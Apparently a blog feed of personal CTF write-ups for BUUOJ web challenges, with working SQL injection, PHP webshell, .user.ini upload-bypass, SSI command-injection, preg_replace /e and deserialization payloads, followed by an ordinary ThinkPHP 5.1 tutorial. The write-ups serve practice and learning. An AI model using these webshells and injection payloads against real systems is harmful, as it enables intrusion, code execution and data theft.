<p>使用<a href="https://github.com/mm0r1/exploits%E7%9A%84exp%EF%BC%8C%E5%B0%86%E5%91%BD%E4%BB%A4%E6%94%B9%E4%B8%BAreadflag%EF%BC%8C%E5%86%8D%E5%AF%B9%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E5%8C%85%E5%90%AB%EF%BC%8C%E5%8F%91%E7%8E%B0flag">https://github.com/mm0r1/exploits的exp，将命令改为readflag，再对文件进行包含，发现flag</a></p>
<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>先登录</p>
<p>用户名可以点击，点击后看到有?no&#x3D;,尝试注入</p>
<p>?no &#x3D; 1 and 1&#x3D;1正常</p>
<p>?no &#x3D; 1 and 1&#x3D;2报错</p>
<p>数字型注入</p>
<p>使用order测试一下，最后发现有4个字段</p>
<p>使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union select 1,2,3,4--+</span><br></pre></td></tr></table></figure>

<p>错误，测试什么被过滤了，单独使用空格，select，union都没有出现hack</p>
<p>查wp说<code>union select</code>被过滤了，可以使用union&#x2F;**&#x2F;select</p>
<p>回显在username，2，所以在2的位置使用sql语句</p>
<p>我们在select user()的时候发现具有root权限</p>
<p>查资料发现root下<code>load_file()</code>函数可以利用绝对路径去加载一个文件</p>
<p>所以可以构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,load_file(&quot;/var/www/html/flag.php&quot;),3,4--+</span><br></pre></td></tr></table></figure>

<p>在源代码中发现flag</p>
<p><img src="/2023/01/29/tp/11.jpg"></p>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>过滤了php，phtml等后缀名，也过滤掉了文件中的&lt;?</p>
<p>题目有回显exif_imagetype，</p>
<p>exif_imagetype ( string <code>$filename</code> ) : int</p>
<p>exif_imagetype() 读取一个图像的第一个字节并检查其签名。</p>
<p>可以在文件头上加上GIF89a，再把文件后缀为jpg</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;</span><br><span class="line">eval($_POST[&#x27;a&#x27;]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>但是测试htaccess,发现行不通</p>
<p>查资料发现可以用.user.ini把文件包含进php文件</p>
<p>在php.ini中，包括<code>PHP_INI_SYSTEM</code>,<code>PHP_INI_PERDIR</code>,<code>PHP_INI_ALL</code>,<code>PHP_INI_USER</code></p>
<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描ini文件,在 .user.ini 格式的ini 文件中只有具有 <code>PHP_INI_PERDIR</code> 和 <code>PHP_INI_USER</code> 模式的 INI 设置可被识别。</p>
<p>.user.ini是一个能被动态加载的ini文件。也就是说修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间，即可被重新加载。</p>
<p>看wp说auto_append_file，指定一个文件，自动包含在要执行的文件前，正好我们可以使用 user.ini修改<code>PHP_INI_PERDIR</code> </p>
<p><img src="/2023/01/29/tp/1.jpg"></p>
<p>上传.user.ini文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=1.jpg</span><br></pre></td></tr></table></figure>

<p>在上传一个jpg格式的webshell</p>
<p>如上</p>
<p>可以直接进行a&#x3D;system(“cat &#x2F;flag”);</p>
<p>下周</p>
<p>复现比赛原题</p>
]]></content>
  </entry>
  <entry>
    <title>做题笔记Feb</title>
    <url>/2023/02/10/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0Feb/</url>
    <content><![CDATA[<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>随便输入可以计算，右键源代码：</p>
<p>存在waf,还有个新的页面进行访问，看到源代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str = $_GET[&#x27;num&#x27;];</span><br><span class="line">        $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;,&#x27;\$&#x27;,&#x27;\\&#x27;,&#x27;\^&#x27;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>构造参数? num&#x3D;phpinfo()（num前面有个空格）就能够绕过：</p>
<p>由于“&#x2F;”被过滤了所以我们可以使用chr(47)来进行表示，进行目录读取：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node4.buuoj.cn:25830/calc.php?%20num=var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>

<p>发现有flag</p>
<p>进行flag读取！！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node4.buuoj.cn:25830/calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></figure>





<h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>扫后台发现index.php.swp备份</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	ob_start();</span><br><span class="line">	function get_hash()&#123;</span><br><span class="line">		$chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;;</span><br><span class="line">		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times</span><br><span class="line">		$content = uniqid().$random;</span><br><span class="line">		return sha1($content); </span><br><span class="line">	&#125;</span><br><span class="line">    header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">	***</span><br><span class="line">    if(isset($_POST[&#x27;username&#x27;]) and $_POST[&#x27;username&#x27;] != &#x27;&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = &#x27;6d0bc1&#x27;;</span><br><span class="line">        if ( $admin == substr(md5($_POST[&#x27;password&#x27;]),0,6)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;</span><br><span class="line">            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">            $text = &#x27;</span><br><span class="line">            ***</span><br><span class="line">            ***</span><br><span class="line">            &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt;</span><br><span class="line">            ***</span><br><span class="line">			***&#x27;;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">			echo &quot;[!] Header  error ...&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">            </span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>发现要求password的md5值的前6个字符为6d0bc1。敲代码（python）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from hashlib import md5</span><br><span class="line"></span><br><span class="line">for i in range(10000000):</span><br><span class="line">    if md5(str(i).encode(&#x27;utf-8&#x27;)).hexdigest()[:6] == &#x27;6d0bc1&#x27;:</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&amp;password=2020666</span><br></pre></td></tr></table></figure>

<p>抓包发现一个url。</p>
<p>这是个shtm，根据命令动态回显网页的某个部分。可以注入，用来远程命令执行。<br>格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;命令&quot;--&gt;</span><br></pre></td></tr></table></figure>


<p>这里的username是个注入点。<br>直接cat &#x2F;flag没反应<br>查看目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;ls&quot;--&gt;&amp;password=2020666</span><br></pre></td></tr></table></figure>


<p>shtml根据指令的不同而不同，所以说每次执行了指令都要复制粘贴shtml网址重新载入。刷新没变化。<br>看看上级目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;&amp;password=2020666</span><br></pre></td></tr></table></figure>

<p>打开flag_990c66bf85a09c664f0b6741840499b2,因为是上级目录，所以要保留..&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;&amp;password=2020666</span><br></pre></td></tr></table></figure>





<h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p>脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url=&#x27;http://25dbc508-48f6-46b7-ab9d-51bafbb12d51.node4.buuoj.cn:81/&#x27;</span><br><span class="line">session=requests.session()</span><br><span class="line"></span><br><span class="line">for i in range(1011):</span><br><span class="line">    geet = session.get(url).text</span><br><span class="line">    find = re.findall(r&#x27;&lt;br&gt;&lt;br&gt;(.*)&lt;br&gt;&lt;br&gt;&#x27;,geet)</span><br><span class="line">    answer = eval(find[0])</span><br><span class="line">    result = session.post(url, data=&#123;&#x27;answer&#x27;: answer&#125;).text</span><br><span class="line">    print(answer,&#x27;kkkk&#x27;,i)</span><br><span class="line">    if &#x27;flag&#123;&#x27; in result:</span><br><span class="line">        print(result)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>



<p>最后应该用requests.session()，因为要保持请求是同一个会话</p>
<p>eval可以直接计算爬出来的表达式</p>
<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>测试了下万能密码登录，无果，有WAF拦截，那接下来就是绕过WAF。</p>
<p>测试了一下现过滤了and、&#x3D; 空格 union等多个sql关键字。</p>
<p>发现有一些报错注入的函数是没有被过滤的，那我们这题就可以通过报错注入来进行注入。</p>
<p>利用updatexml函数进行报错注入，因为过滤了空格，这里我们使用括号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看数据库信息</span><br><span class="line">check.php?username=admin%27or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p>回显geek</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看数据库里面的表</span><br><span class="line">check.php?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=123</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">等号可以替换为like</span><br><span class="line">查看数据表中的字段</span><br><span class="line">check.php?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(%27H4rDsq1%27)),0x7e),1))%23&amp;password=123</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查询字段里面的内容</span><br><span class="line">check.php?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(username,password))from(H4rDsq1)),0x7e),1))%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p>因为报错注入对报错出的内容有长度限制，所以我们用left()right()语句分别查询，然后再进行flag的拼接。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">check.php?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>源码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        die(&quot;Not now!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    include($file);  //next.php</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>首先需要传两个参数，text和file。要求file_get_contents($text,’r’ &#x3D;&#x3D;&#x3D;”I have a dream”</p>
<p>用php:&#x2F;&#x2F;input伪协议绕过。</p>
<p>在url上构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?text=php://input</span><br></pre></td></tr></table></figure>

<p>同时post上传一个I have a dream</p>
<p>然后在file那边是文件包含，利用php:&#x2F;&#x2F;filter伪协议读取。</p>
<p>得到next.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$_SESSION[&#x27;id&#x27;] = $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,</span><br><span class="line">        &#x27;strtolower(&quot;\\1&quot;)&#x27;,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($_GET as $re =&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line">	@eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查资料，题目中是preg_replace漏洞，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_replace( &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,&#x27;strtolower(&quot;\\1&quot;)&#x27;, $str);</span><br></pre></td></tr></table></figure>

<p>构造<code>preg_replace(&#39;.*&#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;, &#123;$&#123;函数名&#125;&#125;);</code><br>相当于把所有字符替换为函数执行结果。<br>但是GET传<code>.*=xxx</code>会出问题，自动将第一个非法字符转化为下划线，所以构造：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">next.php?\S*=$&#123;eval($_POST[cmd])&#125;</span><br></pre></td></tr></table></figure>

<p>同时post一个cmd&#x3D;system(“cat &#x2F;flag”);</p>
<p>发现flag</p>
<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>一直刷新，抓包看一下</p>
<p>传递两个参数，func和p</p>
<p>date应该是个函数，而p的值应该是date的参数</p>
<p>也就是说，这里可能可以执行php函数，首先试试eval</p>
<p>发现可以执行</p>
<p>先试试读index.php的源码把<br>func&#x3D;file_get_contents()&amp;p&#x3D;index.php</p>
<p>源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">    function gettime($func, $p) &#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        if ($a == &quot;string&quot;) &#123;</span><br><span class="line">            return $result;</span><br><span class="line">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">        var $func = &quot;date&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[&quot;func&quot;];</span><br><span class="line">    $p = $_REQUEST[&quot;p&quot;];</span><br><span class="line"></span><br><span class="line">    if ($func != null) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            echo gettime($func, $p);</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            die(&quot;Hacker...&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>

<p>call_user_func()一种调用函数的方法,假设$a&#x3D;var_dump,$b&#x3D;abc,这种调用方法就相当于$a($b) </p>
<p>对$func进行了判断，反序列化，对p也没有什么过滤操作</p>
<p>找到flag在&#x2F;tmp&#x2F;flagoefiu4r93</p>
<p>故构造payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">    var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">    var $func = &quot;date&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a  = new Test();</span><br><span class="line">$a-&gt;func = &quot;system&quot;;</span><br><span class="line">$a-&gt;p = &quot;cat /tmp/flagoefiu4r93&quot;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p>thinkphp开发 反序列化 composer</p>
]]></content>
  </entry>
  <entry>
    <title>thinkphp</title>
    <url>/2023/02/10/thinkphp/</url>
    <content><![CDATA[<p>1.安装composer并设置环境变量</p>
<p>先通过命令行配置composer：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer config -g repo.packagist composer https://packagist.phpcomposer.com</span><br></pre></td></tr></table></figure>

<p>如果下载缓慢或上述地址产生障碍，可以使用国内阿里云镜像地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/</span><br></pre></td></tr></table></figure>

<p>在cmd上安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer create-project topthink/think=5.1.* tp5.1test</span><br></pre></td></tr></table></figure>

<p>2.ThinkPHP的URL访问规则如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://serverName/index.php/模块名/控制器名(类名)/操作名/参数/值...</span><br></pre></td></tr></table></figure>

<p>3.模块设计</p>
<p>ThinkPHP框架的默认访问模块是index，可以通过config目录下的app.php进行设置，</p>
<p><img src="/2023/02/10/thinkphp/Users\86151\Desktop\20200323091742902.png" alt="20200323091742902"></p>
<p>如果application目录下的模块目录只有一个，可以通过配置app.php的app_multi_molule选项设置成false</p>
<p>也可以通过在index.php里的:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Container::get(&#x27;app&#x27;)-&gt;bind(&#x27;模块名&#x27;)-&gt;run()-&gt;send();</span><br></pre></td></tr></table></figure>

<p>这种方式绑定单一的模块。</p>
<p>空模块</p>
<p>我们还可以通过配置app.php的其他选项来控制模块的行为属性，比如empty_module可以控制空模块：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;empty_module&#x27; =&gt; &#x27;404&#x27;</span><br></pre></td></tr></table></figure>

<p>一般可以设置一个404的页面，使空模块指向它。</p>
<p>注意，空模块生效的前提是多模块开启和没有bind模块。</p>
<p>另外，如果我只有一个模块index，则模块的目录可以去掉，然后配置app.php的app_multi_molule选项设置成false，只需要controller目录即可，而命名空间也就去掉了模块名：</p>
<p>namespace app\controller;</p>
<p>4.环境变量</p>
<p>ThinkPHP提供了一个类库Env来获取环境变量，可以用来获取当前项目的各种目录，如应用目录、框架目录、路由目录等等</p>
<p>获取方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Env::get(<span class="string">&#x27;app_path&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>5.控制器定义，控制器操作</p>
<p>基础控制器</p>
<p>BaseController.php</p>
<p>该基础控制器仅仅提供了控制器验证功能，并注入了think\App和think\Request对象，因此你可以直接在控制器中使用app和request属性调用think\App和think\Request对象实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">namespace app\controller;</span><br><span class="line"></span><br><span class="line">use app\BaseController;</span><br><span class="line"></span><br><span class="line">class Index extends BaseController</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        $action = $this-&gt;request-&gt;action();</span><br><span class="line">        $path = $this-&gt;app-&gt;getBasePath();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>基础控制器提供了数据验证功能</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">namespace app\controller;</span><br><span class="line"></span><br><span class="line">use app\BaseController;</span><br><span class="line">use think\exception\ValidateException;</span><br><span class="line"></span><br><span class="line">class Index extends BaseController</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            $this-&gt;validate( [</span><br><span class="line">                &#x27;name&#x27;  =&gt; &#x27;thinkphp&#x27;,</span><br><span class="line">                &#x27;email&#x27; =&gt; &#x27;thinkphp@qq.com&#x27;,</span><br><span class="line">            ],  &#x27;app\index\validate\User&#x27;);</span><br><span class="line">        &#125; catch (ValidateException $e) &#123;</span><br><span class="line">            // 验证失败 输出错误信息</span><br><span class="line">            dump($e-&gt;getError());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>渲染输出的三种方式</p>
<p>1）return</p>
<p>直接将结果return回去即可：</p>
<p>return “这是结果”;<br>2）json输出（比如输出数组）</p>
<p>举例如下：</p>
<p>$data &#x3D; array(‘a’&#x3D;&gt;1,’b’&#x3D;&gt;2,’c’&#x3D;&gt;3);<br>return json($data);<br>3）模板输出</p>
<p>前置操作</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="variable">$beforeActionList</span> = [</span><br><span class="line">    <span class="string">&#x27;first&#x27;</span>,</span><br><span class="line">    <span class="comment">//one方法执行不调用second前置</span></span><br><span class="line">    <span class="string">&#x27;second&#x27;</span> =&gt; [<span class="string">&#x27;except&#x27;</span> =&gt; <span class="string">&#x27;one&#x27;</span>],</span><br><span class="line">    <span class="comment">//third前置只能通过调用one和two方法触发</span></span><br><span class="line">    <span class="string">&#x27;third&#x27;</span> =&gt; [<span class="string">&#x27;only&#x27;</span> =&gt; <span class="string">&#x27;one,two&#x27;</span>],</span><br><span class="line">];</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">first</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;first&lt;br /&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">second</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;second&lt;br /&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">third</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;third&lt;br /&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">one</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;one&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">two</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;two&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>重定向</p>
<p>ThinkPHP的Controller类提供了两个跳转的方法，success(msg,url)和error(msg)，用于实现跳转重定向：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function index()</span><br><span class="line">  &#123;</span><br><span class="line">    if($this-&gt;flag)</span><br><span class="line">    &#123;</span><br><span class="line">      $this-&gt;success(&#x27;成功！&#x27;,&#x27;../&#x27;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      $this-&gt;error(&#x27;失败！&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>上面跳转的页面是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">thinkphp/tpl/dispatch_jump.tpl</span><br></pre></td></tr></table></figure>

<p>配置也在app.php中</p>
<p>6.数据库增删改查</p>
<p>查询数据<br>查询的常见方法有下面的这些：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Db::name();</span><br><span class="line">Db::table();</span><br><span class="line">find();</span><br><span class="line">findOrFail();</span><br><span class="line">findOrEmpty();</span><br><span class="line">select();</span><br><span class="line">selectOrFail();</span><br><span class="line">value(&#x27;username&#x27;);</span><br><span class="line">getLastSql();</span><br><span class="line">column(&#x27;username&#x27;,&#x27;id&#x27;);  //按id排序</span><br><span class="line">order(&#x27;id&#x27;,&#x27;desc&#x27;);       //将结果倒叙排序显示，一般接于where语句之后</span><br></pre></td></tr></table></figure>

<p>注意：除了find和select方法是结果查询之外，其余方法查询结果均为数据库对象，它们可以一直使用链式查询操作，直到遇到find和select方法为止。</p>
